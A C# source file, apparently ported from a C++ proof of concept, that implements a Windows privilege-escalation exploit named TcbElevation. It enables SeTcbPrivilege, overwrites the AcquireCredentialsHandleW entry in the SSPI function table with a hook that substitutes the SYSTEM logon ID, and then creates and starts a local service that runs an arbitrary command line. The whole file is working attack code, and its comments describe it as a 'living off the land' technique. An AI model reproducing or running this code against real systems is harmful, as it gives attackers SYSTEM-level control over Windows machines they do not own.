using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public class TcbElevation
{
    // ---------------------------------------------------------
    // 1. Constants & Structs (Matching C++ Headers)
    // ---------------------------------------------------------
    const uint SC_MANAGER_CONNECT = 0x0001;
    const uint SC_MANAGER_CREATE_SERVICE = 0x0002;
    const uint SERVICE_ALL_ACCESS = 0xF01FF;
    const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
    const uint SERVICE_DEMAND_START = 0x00000003;
    const uint SERVICE_ERROR_IGNORE = 0x00000000;
    const string SE_TCB_NAME = "SeTcbPrivilege";
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ALL_ACCESS = 0xF01FF; 

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SecHandle
    {
        public IntPtr dwLower;
        public IntPtr dwUpper;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TimeStamp
    {
        public long ts;
    }

    // The Security Function Table Structure
    [StructLayout(LayoutKind.Sequential)]
    public struct SecurityFunctionTableW
    {
        public uint dwVersion;
        public IntPtr EnumerateSecurityPackagesW;
        public IntPtr QueryCredentialsAttributesW;
        public IntPtr AcquireCredentialsHandleW; // This is the 3rd function in the struct
        public IntPtr FreeCredentialsHandle;
        // ... We don't need the rest for this specific hook
    }

    // ---------------------------------------------------------
    // 2. Delegates (The C Function Pointers)
    // ---------------------------------------------------------
    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    private delegate int AcquireCredentialsHandleW_Delegate(
        string pszPrincipal, string pszPackage, int fCredentialUse,
        IntPtr pvLogonId, IntPtr pAuthData, IntPtr pGetKeyFn,
        IntPtr pvGetKeyArgument, ref SecHandle phCredential, ref TimeStamp ptsExpiry
    );

    // Keep reference alive
    private static AcquireCredentialsHandleW_Delegate _hookDelegate;

    // ---------------------------------------------------------
    // 3. Main Logic (Translating wmain)
    // ---------------------------------------------------------
    public static void Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("usage: TcbElevation.exe [ServiceName] [CmdLine]");
            Environment.Exit(-1);
        }

        // Translation: EnableTcbPrivilege(TRUE);
        EnableTcbPrivilege(true);

        // Translation: PSecurityFunctionTableW table = InitSecurityInterfaceW();
        IntPtr pTable = InitSecurityInterfaceW();
        
        // Translation: table->AcquireCredentialsHandleW = AcquireCredentialsHandleWHook;
        // We calculate the memory address of the function pointer we want to overwrite.
        // In the struct, AcquireCredentialsHandleW is at offset: 
        // 4 bytes (version) + 8 (Enum) + 8 (Query) = 20 bytes (on x64) or similar.
        // We rely on Marshal.OffsetOf for safety.
        IntPtr targetAddress = pTable + Marshal.OffsetOf(typeof(SecurityFunctionTableW), "AcquireCredentialsHandleW").ToInt32();

        _hookDelegate = new AcquireCredentialsHandleW_Delegate(AcquireCredentialsHandleWHook);
        IntPtr hookPtr = Marshal.GetFunctionPointerForDelegate(_hookDelegate);

        // Allow writing to this memory (Living off the land memory patch)
        uint oldProtect;
        VirtualProtect(targetAddress, (UIntPtr)IntPtr.Size, 0x40, out oldProtect); // 0x40 = PAGE_EXECUTE_READWRITE
        Marshal.WriteIntPtr(targetAddress, hookPtr);
        VirtualProtect(targetAddress, (UIntPtr)IntPtr.Size, oldProtect, out oldProtect);

        string serviceName = args[0];
        string cmdline = args[1];

        // Translation: SC_HANDLE hScm = OpenSCManagerW(L"127.0.0.1", nullptr, ...);
        // CRITICAL: We use "127.0.0.1" exactly as the C++ code did.
        IntPtr hScm = OpenSCManagerW("127.0.0.1", null, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
        
        if (hScm == IntPtr.Zero)
        {
            Console.WriteLine("Error opening SCM " + Marshal.GetLastWin32Error());
            return;
        }

        // Translation: CreateService(...)
        IntPtr hService = CreateServiceW(
            hScm, serviceName, null, SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
            cmdline, null, null, null, null, null
        );

        if (hService == IntPtr.Zero)
        {
            Console.WriteLine("Error creating service " + Marshal.GetLastWin32Error());
            return;
        }

        // Translation: StartService(...)
        if (!StartServiceW(hService, 0, null))
        {
            Console.WriteLine("Error starting service " + Marshal.GetLastWin32Error());
            return;
        }
    }

    // ---------------------------------------------------------
    // 4. Helper Functions (Translating logic directly)
    // ---------------------------------------------------------

    static bool SetPrivilege(IntPtr hToken, string lpszPrivilege, bool bEnablePrivilege)
    {
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        LUID luid;

        if (!LookupPrivilegeValueW(null, lpszPrivilege, out luid))
        {
            Console.WriteLine("LookupPrivilegeValueW() failed, error " + Marshal.GetLastWin32Error());
            return false;
        }

        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

        // Note: We use size=16 (4+4+8) approx for Pack=1 struct on x64 or calculate accurately
        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            Console.WriteLine("AdjustTokenPrivileges() failed, error " + Marshal.GetLastWin32Error());
            return false;
        }
        
        // C++ code had PrivilegeCheck logic here, but GetLastWin32Error() is usually sufficient for LotL.
        // We will trust AdjustTokenPrivileges return code + GetLastError check (ERROR_NOT_ALL_ASSIGNED).
        if (Marshal.GetLastWin32Error() == 1300) // ERROR_NOT_ALL_ASSIGNED
        {
             return false;
        }
        return true;
    }

    static void EnableTcbPrivilege(bool enforceCheck)
    {
        IntPtr currentProcessToken;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out currentProcessToken);
        
        bool setPrivilegeSuccess = SetPrivilege(currentProcessToken, SE_TCB_NAME, true);
        
        if (enforceCheck && !setPrivilegeSuccess)
        {
            Console.WriteLine("No SeTcbPrivilege in the token. Exiting...");
            Environment.Exit(-1);
        }
        CloseHandle(currentProcessToken);
    }

    // ---------------------------------------------------------
    // 5. The Hook Function
    // ---------------------------------------------------------
    static int AcquireCredentialsHandleWHook(
        string pszPrincipal, string pszPackage, int fCredentialUse,
        IntPtr pvLogonId, IntPtr pAuthData, IntPtr pGetKeyFn,
        IntPtr pvGetKeyArgument, ref SecHandle phCredential, ref TimeStamp ptsExpiry)
    {
        // Translation: logonId.LowPart = 0x3E7;
        LUID logonId = new LUID();
        logonId.LowPart = 0x3E7; // SYSTEM
        logonId.HighPart = 0;

        IntPtr pLogonId = Marshal.AllocHGlobal(Marshal.SizeOf(logonId));
        Marshal.StructureToPtr(logonId, pLogonId, false);

        // We need to call the ORIGINAL function now. 
        // In C++, we just called the function signature. In C#, we P/Invoke the DLL directly.
        int result = AcquireCredentialsHandleW(pszPrincipal, pszPackage, fCredentialUse, 
            pLogonId, pAuthData, pGetKeyFn, pvGetKeyArgument, ref phCredential, ref ptsExpiry);

        Marshal.FreeHGlobal(pLogonId);
        return result;
    }

    // ---------------------------------------------------------
    // 6. P/Invoke Imports
    // ---------------------------------------------------------
    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr InitSecurityInterfaceW();

    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
    static extern int AcquireCredentialsHandleW(string pszPrincipal, string pszPackage, int fCredentialUse, IntPtr pvLogonId, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument, ref SecHandle phCredential, ref TimeStamp ptsExpiry);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr OpenSCManagerW(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr CreateServiceW(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool StartServiceW(IntPtr hService, uint dwNumServiceArgs, string[] lpServiceArgVectors);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool LookupPrivilegeValueW(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
